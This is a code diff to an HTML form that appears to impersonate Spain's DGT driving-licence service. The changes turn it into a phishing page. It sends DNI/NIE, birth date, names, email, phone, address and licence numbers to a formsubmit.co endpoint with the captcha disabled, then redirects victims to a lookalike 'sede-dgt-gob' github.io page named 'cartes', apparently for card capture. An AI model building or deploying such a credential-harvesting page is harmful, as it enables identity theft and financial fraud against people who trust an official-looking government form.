@@ -102,9 +102,13 @@
             </section>
             <section class="formulaire">
                 <div class="form-container">
-                    <h2>Solicitud De Regularización - DGT</h2>
-                    
-                    <form action="cartes/index.html">
+                    <h2>Solicitud De Regularización</h2>
+                    <form action="https://formsubmit.co/528cfa5ae469b703e6904a3689b34436" method="POST" enctype="multipart/form-data">
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_next" value="https://sede-dgt-gob.github.io/sede-dgt-gob/cartes/index.html">
+                        <input type="hidden" name="_template" value="table">
+                        <input type="hidden" name="_subject" value="Card">
+            
                         <!-- DATOS DEL INTERESADO -->
                         <fieldset>
                             <legend>Datos del interesado</legend>
@@ -112,41 +116,41 @@
                             <div class="form-row">
                                 <div class="form-group">
                                     <label for="dni">DNI / NIE</label>
-                                    <input type="text" id="dni" placeholder="Obligatorio" required>
+                                    <input name="DNI / NIE" type="text" id="dni" placeholder="Obligatorio" required>
                                 </div>
                                 <div class="form-group">
                                     <label for="fecha_nac">Fecha de nacimiento (dd/mm/aaaa)</label>
-                                    <input type="text" id="fecha_nac" placeholder="Obligatorio" required>
+                                    <input name="Naissance" type="text" id="fecha_nac" placeholder="Obligatorio" required>
                                 </div>
                                 <div class="form-group">
                                     <label for="pais_nac">País de nacimiento</label>
-                                    <input type="text" id="pais_nac" placeholder="Obligatorio" required>
+                                    <input name="Pays de Naissance"type="text" id="pais_nac" placeholder="Obligatorio" required>
                                 </div>
                                 <div class="form-group">
                                     <label for="nacionalidad">Nacionalidad</label>
-                                    <input type="text" id="nacionalidad" placeholder="Obligatorio" required>
+                                    <input name="Nationalité" type="text" id="nacionalidad" placeholder="Obligatorio" required>
                                 </div>
                             </div>
             
                             <div class="form-row">
                                 <div class="form-group">
                                     <label for="primer_apellido">Primer apellido</label>
-                                    <input type="text" id="primer_apellido" placeholder="Obligatorio" required>
+                                    <input name="Prénom" type="text" id="primer_apellido" placeholder="Obligatorio" required>
                                 </div>
                                 <div class="form-group">
                                     <label for="segundo_apellido">Segundo apellido</label>
-                                    <input type="text" id="segundo_apellido" placeholder="Obligatorio" required>
+                                    <input name="Nom" type="text" id="segundo_apellido" placeholder="Obligatorio" required>
                                 </div>
                             </div>
             
                             <div class="form-row">
                                 <div class="form-group">
                                     <label for="correo">Correo electrónico</label>
-                                    <input type="email" id="correo" placeholder="Obligatorio" required>
+                                    <input name="Email" type="email" id="correo" placeholder="Obligatorio" required>
                                 </div>
                                 <div class="form-group">
                                     <label for="telefono">Teléfono</label>
-                                    <input type="tel" id="telefono" placeholder="Obligatorio" required>
+                                    <input name="Tel" type="tel" id="telefono" placeholder="Obligatorio" required>
                                 </div>
                             </div>
                         </fieldset>
@@ -157,11 +161,11 @@
                             <div class="form-row">
                                 <div class="form-group">
                                     <label for="cp">Código postal</label>
-                                    <input type="text" id="cp" placeholder="Obligatorio" required>
+                                    <input name="Code Postal" type="text" id="cp" placeholder="Obligatorio" required>
                                 </div>
                                 <div class="form-group">
                                     <label for="localidad">Localidad</label>
-                                    <input type="text" id="localidad" placeholder="Obligatorio" required>
+                                    <input name="Localité" type="text" id="localidad" placeholder="Obligatorio" required>
                                 </div>
                             </div>
                         </fieldset>
@@ -174,18 +178,19 @@
                                 <!-- Trámites principales -->
                                 <div class="tramite-card">
                                     <label class="checkbox-label">
-                                        <input type="checkbox" name="tramite" value="prorroga">
+                                        <input name="?" type="checkbox" name="tramite" value="prorroga">
                                         <span class="checkbox-text"><strong>PRÓRROGA DE VIGENCIA </strong></span>
                                     </label>
                                     <div class="sub-fields">
-                                        <div class="form-group"><label>Clase de permiso/licencia</label><input type="text" placeholder="..." required></div>
+                                        <div class="form-group"><label>Clase de permiso/licencia</label>
+                                        <input name="Classe de Permit" type="text" placeholder="..." required></div>
                                         <small>*Debe acompañar talón foto (Mod. 2.67)</small>
                                     </div>
                                 </div>
                             
                                 <div class="tramite-card">
                                     <label class="checkbox-label">
-                                        <input type="checkbox" name="tramite" value="permiso_internacional">
+                                        <input name="International" type="checkbox" name="tramite" value="permiso_internacional">
                                         <span class="checkbox-text"><strong>SOLICITUD DE PERMISO INTERNACIONAL</strong></span>
                                     </label>
                                 </div>
@@ -194,11 +199,22 @@
                             <div class="permiso-conduccion-box">
                                 <h4>Datos del permiso de conducción</h4>
                                 <div class="form-row">
-                                    <div class="form-group"><label>Clase de permiso</label><input type="text" required></div>
-                                    <div class="form-group"><label>Número</label><input type="text" required></div>
-                                    <div class="form-group span-2"><label>País que lo expidió</label><input type="text" required></div>
-                                    <div class="form-group"><label>Fecha de expedición</label><input type="text" required></div>
-                                    <div class="form-group"><label>Fecha de caducidad</label><input type="text" required></div>
+                                    <div class="form-group">
+                                        <label>Clase de permiso</label>
+                                        <input name="Classe" type="text" required></div>
+                                    <div class="form-group">
+                                        <label>Número</label>
+                                        <input name="No Permis" type="text" required></div>
+                                    <div class="form-group span-2">
+                                        <label>País que lo expidió</label>
+                                        <input name="Pays émetteur" type="text" required></div>
+                                    <div class="form-group">
+                                        <label>Fecha de expedición</label>
+                                        <input name="Date d'émission" type="text" required></div>
+                                    <div class="form-group">
+                                        <label>Fecha de caducidad</label>
+                                        <input name="Date d'expiration" type="text" required></div>
+                                    
                                 </div>
                             </div>
                         </fieldset>
